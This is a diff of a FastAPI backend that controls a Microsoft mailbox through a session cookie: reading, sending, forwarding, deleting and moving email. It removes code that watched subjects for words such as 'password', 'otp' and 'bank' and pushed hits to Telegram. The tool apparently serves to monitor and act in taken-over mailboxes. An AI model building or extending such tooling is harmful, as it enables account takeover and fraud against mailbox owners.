@@ -15,7 +15,7 @@ from graph import (
     delete_email,
     mark_as_read,
     get_conversation,
-    move_email_to_folder  # ✅ already expected
+    move_email_to_folder  # ✅ ADDED
 )
 from admin_auth import login_admin, require_admin
 from urllib.parse import urlparse, parse_qs
@@ -30,11 +30,6 @@ app = FastAPI()
 # LOGGING
 # =========================
 logging.basicConfig(level=logging.DEBUG)
-
-# =========================
-# ALERT STORAGE
-# =========================
-alerts_store = []
 
 # =========================
 # CORS
@@ -67,29 +62,6 @@ async def log_requests(request: Request, call_next):
     logging.debug(f"--- REQUEST END ---\n")
 
     return response
-
-# =========================
-# WEBSOCKET ALERTS
-# =========================
-connected_clients = []
-
-@app.websocket("/ws/alerts")
-async def websocket_alerts(ws: WebSocket):
-    await ws.accept()
-    connected_clients.append(ws)
-
-    try:
-        while True:
-            await ws.receive_text()
-    except:
-        connected_clients.remove(ws)
-
-async def broadcast_alert(message: str):
-    for ws in connected_clients:
-        try:
-            await ws.send_text(message)
-        except:
-            pass
 
 # =========================
 # STARTUP
@@ -126,6 +98,15 @@ async def admin_login_route(request: Request):
     logging.debug("ADMIN LOGIN SUCCESS → COOKIE SET")
 
     return response
+
+# =========================
+# ✅ ADMIN LOGOUT (NEW)
+# =========================
+@app.get("/admin/logout")
+def admin_logout():
+    res = JSONResponse({"message": "Logged out"})
+    res.delete_cookie("admin_session", path="/")
+    return res
 
 # =========================
 # MICROSOFT LOGIN
@@ -197,38 +178,20 @@ def check_session(request: Request):
     }
 
 # =========================
-# EMAILS (WITH ALERTS)
+# EMAILS
 # =========================
 @app.get("/emails")
 def get_emails(request: Request, user_id: str = None):
     require_admin(request)
 
     session_id = request.cookies.get("session_id")
-    logging.debug(f"SESSION IN EMAILS: {session_id}")
 
     if not session_id or session_id == "default":
         return JSONResponse({"error": "No Microsoft session"}, status_code=401)
 
-    emails = fetch_emails(user_id or "default-user", session_id)
-
-    ALERT_KEYWORDS = ["password", "bank", "otp", "urgent", "invoice", "payment"]
-
-    for e in emails:
-        subject = (e.get("subject") or "").lower()
-
-        for word in ALERT_KEYWORDS:
-            if word in subject:
-                msg = f"🚨 {word.upper()} detected → {e.get('subject')}"
-
-                send_telegram_alert(msg)
-                alerts_store.append({"message": msg})
-
-                try:
-                    asyncio.create_task(broadcast_alert(msg))
-                except:
-                    pass
-
-    return {"emails": emails}
+    return {
+        "emails": fetch_emails(user_id or "default-user", session_id)
+    }
 
 # =========================
 # FOLDERS
@@ -247,12 +210,90 @@ def get_folders(request: Request, user_id: str = None):
     }
 
 # =========================
-# ALERTS
+# EMAIL DETAIL
 # =========================
-@app.get("/alerts")
-def get_alerts(request: Request):
+@app.get("/email/{message_id}")
+def email_detail(message_id: str, request: Request, user_id: str = None):
     require_admin(request)
-    return {"alerts": alerts_store}
+
+    session_id = request.cookies.get("session_id")
+
+    return get_email_detail(user_id or "default-user", session_id, message_id)
+
+# =========================
+# ✅ EMAIL ACTION ROUTES (NEW)
+# =========================
+@app.post("/email/reply")
+async def reply_email_route(request: Request):
+    require_admin(request)
+    body = await request.json()
+
+    return reply_to_email(
+        user_id="default-user",
+        session_id=request.cookies.get("session_id"),
+        message_id=body.get("message_id"),
+        reply_text=body.get("reply_text")
+    )
+
+@app.post("/email/send")
+async def send_email_route(request: Request):
+    require_admin(request)
+    body = await request.json()
+
+    return send_email(
+        user_id="default-user",
+        session_id=request.cookies.get("session_id"),
+        to=body.get("to"),
+        subject=body.get("subject"),
+        body=body.get("body")
+    )
+
+@app.post("/email/forward")
+async def forward_email_route(request: Request):
+    require_admin(request)
+    body = await request.json()
+
+    return forward_email(
+        "default-user",
+        request.cookies.get("session_id"),
+        body.get("message_id"),
+        body.get("to")
+    )
+
+@app.post("/email/delete")
+async def delete_email_route(request: Request):
+    require_admin(request)
+    body = await request.json()
+
+    return delete_email(
+        "default-user",
+        request.cookies.get("session_id"),
+        body.get("message_id")
+    )
+
+@app.post("/email/mark-read")
+async def mark_read_route(request: Request):
+    require_admin(request)
+    body = await request.json()
+
+    return mark_as_read(
+        "default-user",
+        request.cookies.get("session_id"),
+        body.get("message_id"),
+        body.get("is_read", True)
+    )
+
+@app.post("/email/move")
+async def move_email_route(request: Request):
+    require_admin(request)
+    body = await request.json()
+
+    return move_email_to_folder(
+        "default-user",
+        request.cookies.get("session_id"),
+        body.get("message_id"),
+        body.get("folder_id")
+    )
 
 # =========================
 # RULES
@@ -294,90 +335,3 @@ def get_rules(request: Request):
 
     db.close()
     return {"rules": result}
-
-# =========================
-# EMAIL ACTION ROUTES (🔥 ADDED ONLY)
-# =========================
-
-@app.post("/email/reply")
-async def reply_email_route(request: Request):
-    require_admin(request)
-    body = await request.json()
-    session_id = request.cookies.get("session_id")
-
-    return reply_to_email(
-        "default-user",
-        session_id,
-        body.get("message_id"),
-        body.get("reply_text")
-    )
-
-
-@app.post("/email/send")
-async def send_email_route(request: Request):
-    require_admin(request)
-    body = await request.json()
-    session_id = request.cookies.get("session_id")
-
-    return send_email(
-        "default-user",
-        session_id,
-        body.get("to"),
-        body.get("subject"),
-        body.get("body")
-    )
-
-
-@app.post("/email/forward")
-async def forward_email_route(request: Request):
-    require_admin(request)
-    body = await request.json()
-    session_id = request.cookies.get("session_id")
-
-    return forward_email(
-        "default-user",
-        session_id,
-        body.get("message_id"),
-        body.get("to")
-    )
-
-
-@app.post("/email/delete")
-async def delete_email_route(request: Request):
-    require_admin(request)
-    body = await request.json()
-    session_id = request.cookies.get("session_id")
-
-    return delete_email(
-        "default-user",
-        session_id,
-        body.get("message_id")
-    )
-
-
-@app.post("/email/mark-read")
-async def mark_read_route(request: Request):
-    require_admin(request)
-    body = await request.json()
-    session_id = request.cookies.get("session_id")
-
-    return mark_as_read(
-        "default-user",
-        session_id,
-        body.get("message_id"),
-        body.get("is_read", True)
-    )
-
-
-@app.post("/email/move")
-async def move_email_route(request: Request):
-    require_admin(request)
-    body = await request.json()
-    session_id = request.cookies.get("session_id")
-
-    return move_email_to_folder(
-        "default-user",
-        session_id,
-        body.get("message_id"),
-        body.get("folder_id")
-    )
